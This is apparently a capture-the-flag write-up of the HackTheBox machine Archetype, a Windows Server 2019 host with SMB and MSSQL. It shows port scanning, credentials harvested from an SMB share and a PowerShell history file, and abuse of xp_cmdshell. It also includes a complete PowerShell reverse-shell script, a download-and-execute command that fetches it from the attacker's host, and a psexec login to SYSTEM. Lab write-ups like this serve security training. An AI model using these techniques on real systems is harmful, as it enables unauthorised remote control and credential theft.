---
title: 'HackTheBox write-up: Archetype'
author: ib4rz
date: 2021-09-01 20:48
categories: [Starting Point, Windows]
image:
  path: /assets/img/Archetype/Archetype.png
tags: [Very Easy, SMB, SQL, RCE]
---

This is a write-up for the Archetype machine on HackTheBox. It belonged to the "Starting Point" series.

## Basic Information
---

Machine IP: __10.10.10.27__ \
Type: __Windows__ \
Difficulty: __Very Easy__

## Scanning
---

First, to find interesting open ports, let's do some reconnaissance and scanning using [nmap](https://nmap.org/).

```console
$ nmap -p- --open -T5 -v -n 10.10.10.27
```

Parameters explanation:

- _p-_: Scan all 65,535 possible port numbers.
- _open_: Only show open (or possibly open) ports.
- _T5_: Faster scan _(T<0-5>)_.
- _v_: Increase verbosity level.
- _n_: Never do DNS resolution.


```console
$ nmap -p- --open -T5 -v -n 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 08:41 CEST
Happy 24th Birthday to Nmap, may it live to be 124!
Initiating Ping Scan at 08:41
Scanning 10.10.10.27 [4 ports]
Completed Ping Scan at 08:41, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:41
Scanning 10.10.10.27 [65535 ports]
Discovered open port 445/tcp on 10.10.10.27
Discovered open port 135/tcp on 10.10.10.27
Discovered open port 139/tcp on 10.10.10.27
Discovered open port 5985/tcp on 10.10.10.27
Discovered open port 49665/tcp on 10.10.10.27
Discovered open port 49666/tcp on 10.10.10.27
Discovered open port 49664/tcp on 10.10.10.27
Discovered open port 47001/tcp on 10.10.10.27
Discovered open port 1433/tcp on 10.10.10.27
Discovered open port 49669/tcp on 10.10.10.27
Discovered open port 49668/tcp on 10.10.10.27
Discovered open port 49667/tcp on 10.10.10.27
Completed SYN Stealth Scan at 08:41, 12.96s elapsed (65535 total ports)
Nmap scan report for 10.10.10.27
Host is up (0.050s latency).
Not shown: 65453 closed ports, 70 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
           Raw packets sent: 69185 (3.044MB) | Rcvd: 66644 (2.666MB)
```

We see some interesting ports like [139/445](https://www.upguard.com/blog/smb-port) and [1433](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-a-server-to-listen-on-a-specific-tcp-port?view=sql-server-ver15).


## Enumeration
---

We can run `Nmap Scripting Engine` for service/version detection running through each port for the best results.

```console
$ nmap -sV -sC -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.27
```

Parameters explanation:

- _sV_: Service fingerprinting.
- _sC_: Launch default NSE nmap scripts.
- _p_: Only scan specified ports.

```console
$ nmap -sV -sC -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 08:51 CEST
Nmap scan report for 10.10.10.27
Host is up (0.092s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-01T06:38:41
|_Not valid after:  2051-09-01T06:38:41
|_ssl-date: 2021-09-01T07:11:27+00:00; +19m15s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h43m15s, deviation: 3h07m51s, median: 19m14s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-01T00:11:19-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-01T07:11:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.83 seconds
```

So, on port 139, a __NetBIOS session service__ is running. The service facilitates authentication across a Windows workgroup or domain and provides access to resources (such as files and printers).

Port 445 is used for __Server Message Block__, the internet standard protocol Windows uses to share files, printers, serial ports, etc.

Port 1433 runs __SQL server__, meaning some database is running on the server.


## Vulnerability Analysis & Exploitation
---

Since the __SMB protocol__ is used to share files, we can try to connect anonymously in search of exciting files. 


> Kali comes with a `preinstalled tool` called [smbmap](https://tools.kali.org/information-gathering/smbmap) which enables us to look at the exposed shared resources and their permissions:
{: .prompt-tip }

```console
$ smbmap -H 10.10.10.27 -u " " -p " "
[+] Guest session       IP: 10.10.10.27:445     Name: 10.10.10.27
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backups                                                 READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```
We have read access in:
- __backups__: It is the only non-default share and lacks a comment, which could contain interesting data.

- __IPC$__: This hidden share is a special share used for inter-process communication. Allows one to communicate with processes running on the remote system.

Digging into SMB using [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), we get a connect on backups shares without auth.

```console
$ smbclient //10.10.10.27/backups
Enter WORKGROUP\root password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                10328063 blocks of size 4096. 8259491 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \> exit
```

We have a file called `prod.dtsConfig`{: .filepath} in that share.

> Files with a `.dtsConfig extensions` are [XML](https://en.wikipedia.org/wiki/XML#:~:text=Extensible%20Markup%20Language%20(XML)%20is,free%20open%20standards%E2%80%94define%20XML.) syntax configuration files used to apply property values to SQL Server Integration Services (_SSIS_) packages.
{: .prompt-info }

Using `get <FILENAME>`, we can download the file to our local machine.

On our local machine, we can use the command `cat prod.dtsConfig` to show the content.


```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
It looks like there's a SQL user and password in there! 

```yml
user: ARCHETYPE\sql_svc
pass: M3g4c0rp123
```

### Foothold
---

We see it contains a SQL connection string containing credentials for the local Windows user `ARCHETYPE\sql_svc`.

Let's try connecting to the SQL Server using [Impacket's](https://github.com/SecureAuthCorp/impacket) msqliclient.py.


```console
$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

We now have a server connection! Now we can use the `IS_SRVROLEMEMBER` function to check whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. 

The syntax of the function is:

```sql
IS_SRVROLEMEMBER ( 'role' [ , 'login' ] )
```

In which we have two arguments:

- `role`: We indicate the role, which may be one of the following.
    - sysadmin
    - serveradmin
    - dbcreator
    - setupadmin
    - bulkadmin
    - securityadmin
    - diskadmin
    - public
    - processadmin
- `login`: Name of the SQL Server.

In our __SQL Server__ session, we will use the following command:

```console
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```
If the statement (the query) is true we receive no output, if it's false we get "NULL" as an output.
This outputs:

```console
-----------   

          1
```

The user belongs to the system administrators, meaning we have the database's highest privileges.

We have administrator permissions, so we can use some SQL server configuration tools to enable a remote connection. To start with, we will use [`sp_configure`](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15) to modify some global server settings.

Its syntax is as follows:


```
sp_configure [ @configname = ] 'hadoop connectivity',  
             [ @configvalue = ] { 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 }
```

Arguments:

- __[ @configname= ]__ '_option_name_': Is the name of a configuration option. _option_name_ is __varchar(35)__, with a default of `NULL`.
- __[ @configvalue= ]__ '_value_': Is the new configuration setting. _value_ is __int__, with a default of `NULL`.

Once we have changed some configuration, it is necessary to use `reconfigure`; to apply the changes.

Running the following command:

```console
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
```

Using the _option_name_ 'Show Advanced Options', we observe a configuration called [`xp_cmdshell`](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which spawns a Windows command shell and passes in a string for execution.

```console
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure;
```

To check if it works, we can try to execute a command.

```console
SQL> xp_cmdshell "whoami"
```
This outputs:

```console
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL
```
We can see that the user `archetype\sql_svc` is displayed again; this means that SQL Server runs with that user inside Windows. `NULL` appears, which means he doesn't have administrator permissions. 

To gain a reverse shell, we will use the following code:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.14",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "# ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()};
$client.Close()
```

We save the above code in a file `shell.ps1`{: .filepath} on our local machine.
> Remember to put your IP address.
{: .prompt-warning }


### Getting complete control (RCE)
---

Now we have to transfer the PowerShell script onto the server somehow.
For this, we will start a python web server in one window using the following command:

```console
$ python3 -m http.server 80
```
This command will start a webserver in your current working directory.

In another window, we spawn a Netcat listener listening on port 443:

```console
$ nc -nlvp 443
```

> Depending on your firewall, you might need to `add a rule` so that the server can connect to your local machine.
{: .prompt-warning }


```console
$ ufw allow from 10.10.10.27 proto tcp to any port 80,443
```

Now, let's go back to our SQL terminal; we will use the `xp_cmdshell` tool we used previously. We will invoke a connection to our local HTTP server that allows us to download the reverse shell (`shell.ps1`{: .filepath}) and execute it.

The command is:

```console
$ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.14/shell.ps1\");"
```
A shell is received as sql_svc, and we can get the `user.txt`{: .filepath} flag on their desktop.

```console
$ nc -nlvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.27.
Ncat: Connection from 10.10.10.27:49694.
whoami
archetype\sql_svc
$ pwd
Path
----
C:\Windows\system32
$ cd C:\Users\sql_svc\Desktop
$ dir


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:37 AM             32 user.txt
```

## Privilege Escalation
---

We already got the user-level flag. Now let's get the admin flag level.

Unfortunately, _sql_svc_ is a standard user account without administrative permissions, meaning we have to do privilege escalation before obtaining the system flag.

Doing a recursive search for "__admin__" from `C:\Users\sql_svc` we obtain a PowerShell history file.

```powershell
dir -Force -recurse *.* | sls -pattern "admin" | select -unique path
```

We get the following path:
```console
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

As this is a regular user account and a service account, it is worth checking that history file.

```powershell
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
This outputs:
```console
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

This means that the backup share got mounted locally and assigned the drive letter T using the administrator account.

To connect, we will use a version of [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) included in `impacket`.

```console
$ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27
```

This outputs:

```console
$ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN
[*] Uploading file GBStfHSI.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service jLDP on 10.10.10.27.....
[*] Starting service jLDP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
Checking permissions:
```console
C:\Windows\system32> whoami
nt authority\system
```

We now escalated our permissions from a default user to root. We can access the flag on the administrator desktop.

```console
C:\Windows\system32> cd C:\Users\Administrator\Desktop
```

```console
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\Administrator\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  33,827,815,424 bytes free
```

```console
C:\Users\Administrator\Desktop> type root.txt
```

That's it; Archetype has been Pwned!